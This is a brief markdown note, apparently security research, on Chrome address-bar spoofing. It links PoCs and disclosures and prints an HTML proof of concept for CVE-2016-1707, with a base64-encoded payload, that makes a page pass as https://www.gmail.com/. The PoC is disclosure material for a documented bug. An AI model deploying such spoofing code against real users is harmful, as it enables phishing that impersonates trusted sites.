## chrome browser

### PC
- https://github.com/musalbas/address-spoofing-poc
- https://bugs.chromium.org/p/chromium/issues/detail?id=68956

### iOS
- https://xlab.tencent.com/en/2016/10/10/cve-2016-1707-chrome-address-bar-url-spoofing-on-ios/

CVE-2016-1707
``` html
<script>

payload="PGJvZHk+PC9ib2R5Pg0KPHNjcmlwdD4NCiAgICB2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICBsaW5rLmhyZWYgPSAnaHR0cHM6Ly9nbWFpbC5jb206Oic7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICBsaW5rLmNsaWNrKCk7DQo8L3NjcmlwdD4=";

function pwned() {

    var t = window.open('https://www.gmail.com/', 'aaaa');
    t.document.write(atob(payload));
    t.document.write("<h1>Address bar says https://www.gmail.com/ - this is NOT https://www.gmail.com/</h1>");
}

</script>

<a href="https://hack.com::/"  target="aaaa" onclick="setTimeout('pwned()','500')">click me</a><br>
```


### reference
- https://seclists.org/fulldisclosure/2015/Jun/108